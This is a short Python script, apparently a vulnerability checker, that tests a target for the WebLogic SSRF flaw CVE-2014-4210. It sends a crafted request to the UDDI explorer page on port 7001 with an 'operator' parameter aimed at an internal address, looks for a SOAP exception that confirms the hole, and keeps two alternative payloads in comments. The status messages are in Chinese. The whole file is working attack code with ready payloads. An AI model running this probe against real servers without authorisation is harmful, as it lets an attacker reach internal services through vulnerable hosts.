import requests


def ssrf(url):
    """Version: 10.0.2/10.3.6
    CVE-2014-4210"""

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"

    }
    # payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001"
    # payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
    payload = ":7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7001&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"

    vulurl = url + payload

    try:
        req = requests.get(vulurl, headers=headers, timeout=10, verify=False)
        if "weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and "IO Exception on sendMessage" not in req.text:
            print("[+] 存在WebLogic SSRF(CVE-2014-4210)漏洞,漏洞地址为：\n")
            print(vulurl)
    except:
        print("[-]------------可能连接超时 or 目标不存在此漏洞----------")
        print("我现在还是一个可爱的小朋友，我的功能还没有那么完善。")


ssrf("http://www.7089b")